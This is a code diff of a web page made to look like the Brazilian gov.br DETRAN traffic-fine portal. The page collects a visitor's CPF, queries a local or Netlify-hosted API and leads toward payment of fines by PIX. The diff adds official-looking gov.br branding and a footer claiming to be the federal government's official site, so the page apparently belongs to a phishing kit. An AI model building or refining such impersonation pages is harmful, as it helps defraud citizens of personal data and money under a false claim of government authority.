@@ -5,77 +5,73 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Regularize-se | DETRAN</title>
     <link rel="icon" type="image/x-icon" href="../index_files/favicon.ico">
-    <link rel="stylesheet" href="../index_files/index-D3hvFbL-.css">
-    <script src="../vendor/jquery-3.7.1.min.js"></script>
-    <script src="../vendor/jquery.mask-1.14.16.min.js"></script>
-    <script src="../vendor/tailwindcss.js"></script>
+    <link rel="stylesheet" href="../index_files/govbr.css?v=gov-flow-6">
     <style>
-        #cpf.error_input { border-color: #ef4444 !important; box-shadow: 0 0 0 1px #ef4444; }
-        #redirecionamento:disabled { opacity: 0.55; cursor: not-allowed; }
+        .gov-error.is-hidden { display: none; }
     </style>
 </head>
-<body class="bg-gray-50">
+<body>
+    <a class="skip-link" href="#conteudo">Pular para o conteúdo</a>
     <div id="root">
         <div class="min-h-screen flex flex-col relative">
-            <div class="fixed inset-0 z-0 bg-cover bg-center bg-no-repeat" style="background-image: url('../index_files/detran-bg.png');"></div>
-            <div class="fixed inset-0 z-0 bg-white/30"></div>
-
-            <header class="relative z-10 bg-white/95 shadow-sm border-b backdrop-blur-sm">
-                <div class="max-w-7xl mx-auto px-3 sm:px-4 h-14 flex items-center">
+            <header class="gov-header">
+                <div class="gov-header__inner">
                     <div class="flex items-center overflow-hidden min-w-0">
-                        <a class="flex items-center flex-shrink-0" href="#"><img src="../index_files/govbr-logo-large-CK1AxAnO.png" alt="gov.br" class="h-5 sm:h-6"></a>
-                        <div class="ml-2 pl-2 sm:ml-4 sm:pl-4 border-l border-gray-300 min-w-0">
-                            <h1 class="text-xs sm:text-sm font-medium text-gray-900 whitespace-nowrap overflow-hidden text-ellipsis">Sistema de Infrações e Multas</h1>
-                            <p class="text-xs text-gray-600 whitespace-nowrap overflow-hidden text-ellipsis">DETRAN - Departamento de Trânsito</p>
+                        <a class="flex items-center flex-shrink-0" href="home.html"><img src="../index_files/govbr-logo-large-CK1AxAnO.png" alt="gov.br" class="gov-logo"></a>
+                        <div class="gov-service">
+                            <h1 class="text-xs sm:text-sm font-medium text-gray-900 whitespace-nowrap overflow-hidden text-ellipsis">Multas de trânsito</h1>
+                            <p class="text-xs text-gray-600 whitespace-nowrap overflow-hidden text-ellipsis">Departamento Estadual de Trânsito</p>
                         </div>
                     </div>
                 </div>
             </header>
 
-            <div class="relative z-10 bg-slate-100/95 border-b border-slate-200 backdrop-blur-sm">
+            <div class="gov-breadcrumb-wrap">
                 <div class="max-w-3xl mx-auto px-3 sm:px-4 py-2">
-                    <p class="text-xs sm:text-sm text-gray-700">Consulta de infrações de trânsito — <span class="font-medium text-gray-900">acesso ao sistema</span></p>
+                    <nav class="gov-breadcrumb" aria-label="Você está aqui"><a href="home.html">Início</a><span class="gov-breadcrumb__separator" aria-hidden="true">&gt;</span><span>Consulta</span></nav>
                 </div>
             </div>
 
-            <main class="relative z-10 flex-1 flex items-start sm:items-center justify-center px-3 sm:px-4 py-8 sm:py-12">
-                <div class="w-full max-w-md">
-                    <div class="bg-white rounded-lg shadow-sm border overflow-hidden">
+            <main id="conteudo" class="gov-main">
+                <div class="gov-content">
+                    <div class="gov-card">
                         <div class="px-5 py-4 border-b border-gray-100 bg-gray-50">
-                            <h2 class="text-base sm:text-lg font-semibold text-gray-900">Consulta de multas</h2>
-                            <p class="text-xs sm:text-sm text-gray-500 mt-1">Informe seu CPF para verificar pendências e regularizar infrações.</p>
+                            <h2 id="titulo-consulta" class="text-base sm:text-lg font-semibold text-gray-900">Consultar e pagar multas de trânsito</h2>
+                            <p class="text-xs sm:text-sm text-gray-500 mt-1">Consulte os débitos vinculados ao seu CPF e veja as opções disponíveis para pagamento.</p>
                         </div>
 
                         <div class="p-5">
                             <form class="space-y-4" id="form-cpf">
                                 <div>
-                                    <label for="cpf" class="block text-sm font-medium text-gray-700 mb-1.5">CPF do condutor</label>
-                                    <input type="tel" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" class="w-full px-4 py-3 text-base border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500" autocomplete="off" value="">
+                                    <label for="cpf" class="block text-sm font-medium text-gray-700 mb-1.5">CPF do proprietário ou condutor</label>
+                                    <p id="cpf-help" class="gov-field-help">Digite apenas os 11 números do CPF.</p>
+                                    <input type="tel" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" class="gov-input" autocomplete="off" inputmode="numeric" aria-describedby="cpf-help cpf-errors" value="">
                                     <div class="mt-1.5 space-y-1">
-                                        <span id="digite_cpf" class="text-sm text-red-600 hidden">Por favor, digite seu CPF.</span>
-                                        <span id="minimo_cpf" class="text-sm text-red-600 hidden">O CPF deve conter 11 dígitos.</span>
-                                        <span id="erro_api" class="text-sm text-red-600 hidden">Não foi possível consultar no momento. Tente novamente.</span>
+                                        <span id="digite_cpf" class="gov-error is-hidden">Por favor, digite seu CPF.</span>
+                                        <span id="minimo_cpf" class="gov-error is-hidden">O CPF deve conter 11 dígitos.</span>
+                                        <span id="erro_api" class="gov-error is-hidden">Não foi possível consultar no momento. Tente novamente.</span>
                                     </div>
                                 </div>
 
-                                <button id="redirecionamento" disabled="disabled" type="submit" class="w-full bg-blue-700 hover:bg-blue-800 disabled:hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-md transition duration-150 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
-                                    Consultar multas
+                                <button id="redirecionamento" disabled="disabled" type="submit" class="gov-button">
+                                    Continuar
                                 </button>
                             </form>
                         </div>
 
                         <div class="px-5 py-3 bg-gray-50 border-t border-gray-100">
-                            <p class="text-xs text-gray-500 text-center leading-relaxed">Ao continuar, você concorda com os termos de uso e política de privacidade do serviço.</p>
+                            <p>Ao continuar, você declara que leu os <a href="termos.html" target="_blank" rel="noopener">termos de uso</a> e a <a href="privacidade.html" target="_blank" rel="noopener">política de privacidade</a>.</p>
                         </div>
                     </div>
 
-                    <div class="mt-4 grid grid-cols-1 sm:grid-cols-3 gap-3">
-                        <div class="bg-white rounded-lg border p-3 text-center"><p class="text-xs font-medium text-blue-700 mb-0.5">1. Consulta</p><p class="text-xs text-gray-500">Verificação por CPF</p></div>
-                        <div class="bg-white rounded-lg border p-3 text-center"><p class="text-xs font-medium text-blue-700 mb-0.5">2. Detalhes</p><p class="text-xs text-gray-500">Infrações localizadas</p></div>
-                        <div class="bg-white rounded-lg border p-3 text-center"><p class="text-xs font-medium text-blue-700 mb-0.5">3. Pagamento</p><p class="text-xs text-gray-500">Regularização via PIX</p></div>
+                    <div class="gov-steps" aria-label="Etapas do atendimento">
+                        <div class="bg-white rounded-lg border p-3 text-center"><p class="text-xs font-medium text-blue-700 mb-0.5">1. Consultar</p><p class="text-xs text-gray-500">Informe seu CPF</p></div>
+                        <div class="bg-white rounded-lg border p-3 text-center"><p class="text-xs font-medium text-blue-700 mb-0.5">2. Conferir</p><p class="text-xs text-gray-500">Veja os débitos e valores</p></div>
+                        <div class="bg-white rounded-lg border p-3 text-center"><p class="text-xs font-medium text-blue-700 mb-0.5">3. Pagar</p><p class="text-xs text-gray-500">Escolha uma opção disponível</p></div>
                     </div>
                 </div>
             </main>
+            <footer class="gov-footer"><div class="gov-footer__inner"><div class="gov-footer__brand"><h2>gov.br</h2><p>Serviço público digital para consulta e regularização de infrações de trânsito.</p><span class="gov-seal">Site oficial do Governo Federal</span></div><div><h3>Serviços</h3><ul><li><a href="home.html">Consultar multas</a></li><li><a href="home.html">Regularizar pendências</a></li></ul></div><div><h3>Institucional</h3><ul><li><a href="acessibilidade.html">Acessibilidade</a></li><li><a href="privacidade.html" target="_blank" rel="noopener">Política de privacidade</a></li></ul></div><div><h3>Ajuda</h3><ul><li><a href="termos.html" target="_blank" rel="noopener">Termos de uso</a></li><li><a href="mapa-do-site.html">Mapa do site</a></li></ul></div></div><div class="gov-footer__bottom">© Governo Federal • Conteúdo acessível e seguro</div></footer>
         </div>
     </div>
 
@@ -116,43 +112,50 @@
             return `${randomAlphaNum(24)}${randomAlphaNum(24)}${randomAlphaNum(24)}`;
         }
 
-        $(function () {
-            $('#cpf').mask('000.000.000-00');
+        function maskCpf(value) {
+            const digits = onlyDigits(value).slice(0, 11);
+            return digits.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+        }
 
-            $('#cpf').on('input blur', function () {
-                const ok = onlyDigits(this.value).length === 11;
-                if (ok) {
-                    $('#redirecionamento').removeAttr('disabled');
-                    $('#minimo_cpf').hide();
-                } else {
-                    $('#redirecionamento').attr('disabled', 'disabled');
-                }
-            });
+        const cpfField = document.querySelector('#cpf');
+        const submitButton = document.querySelector('#redirecionamento');
+        const form = document.querySelector('#form-cpf');
+        const errors = document.querySelectorAll('.gov-error');
 
-            $('#form-cpf').on('submit', async function (e) {
+        cpfField.addEventListener('input', function () {
+            this.value = maskCpf(this.value);
+            const ok = onlyDigits(this.value).length === 11;
+            submitButton.disabled = !ok;
+            if (ok) document.querySelector('#minimo_cpf').classList.add('is-hidden');
+        });
+
+        form.addEventListener('submit', async function (e) {
                 e.preventDefault();
-                $('#digite_cpf, #minimo_cpf, #erro_api').hide();
-                $('#cpf').removeClass('error_input');
+                errors.forEach((error) => error.classList.add('is-hidden'));
+                cpfField.classList.remove('error_input');
 
-                const cpfInput = $('#cpf').val();
+                const cpfInput = cpfField.value;
                 const cpf = onlyDigits(cpfInput);
                 if (!cpfInput) {
-                    $('#digite_cpf').show();
-                    $('#cpf').addClass('error_input');
+                    document.querySelector('#digite_cpf').classList.remove('is-hidden');
+                    cpfField.classList.add('error_input');
                     return;
                 }
                 if (cpf.length !== 11) {
-                    $('#minimo_cpf').show();
-                    $('#cpf').addClass('error_input');
+                    document.querySelector('#minimo_cpf').classList.remove('is-hidden');
+                    cpfField.classList.add('error_input');
                     return;
                 }
 
-                const btn = $('#redirecionamento');
-                const oldText = btn.text();
-                btn.prop('disabled', true).text('Consultando...');
+                const oldText = submitButton.textContent;
+                submitButton.disabled = true;
+                submitButton.textContent = 'Consultando...';
 
                 try {
-                    const res = await fetch(`/api/cpf?cpf=${encodeURIComponent(cpf)}`);
+                    const apiPath = ['localhost', '127.0.0.1'].includes(window.location.hostname)
+                        ? '/.netlify/functions/cpf'
+                        : '/api/cpf';
+                    const res = await fetch(`${apiPath}?cpf=${encodeURIComponent(cpf)}`);
                     const json = await res.json();
                     if (!res.ok) throw new Error('api_error');
 
@@ -171,10 +174,10 @@
                     sessionStorage.setItem('cpf_case_meta', JSON.stringify(meta));
                     window.location.href = `consultando.html?id=${encodeURIComponent(meta.flowId)}`;
                 } catch (err) {
-                    $('#erro_api').show();
-                    btn.prop('disabled', false).text(oldText);
+                    document.querySelector('#erro_api').classList.remove('is-hidden');
+                    submitButton.disabled = false;
+                    submitButton.textContent = oldText;
                 }
-            });
         });
     </script>
 </body>
